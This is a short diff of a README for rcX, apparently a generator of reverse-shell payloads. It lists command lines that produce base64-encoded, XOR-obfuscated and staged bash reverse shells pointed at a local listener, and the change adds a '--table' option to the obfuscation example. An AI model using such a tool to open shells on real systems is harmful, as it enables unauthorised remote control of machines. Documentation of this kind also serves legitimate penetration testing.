@@ -28,7 +28,7 @@ or Download the packaged binaries
 ##### 4.Get a base64 encoded bash reverse shell.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash -e base64`
 ##### 5.Get a xor encoded and obfuscated bash reverse shell.
-`python rcX.py -l 127.0.0.1 -p 8888 -t bash -e xor --obf reverse --clip 7`
+`python rcX.py -l 127.0.0.1 -p 8888 -t bash -e xor --obf reverse --table --clip 7`
 ![rcX](https://cdn.rawgit.com/FlyfishSec/rcX/main/rcX-png/rcx-obf.png "rcX")
 ##### 6.Get a staging bash reverse shell.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash --staging-url 0 --staging-cmd 0`
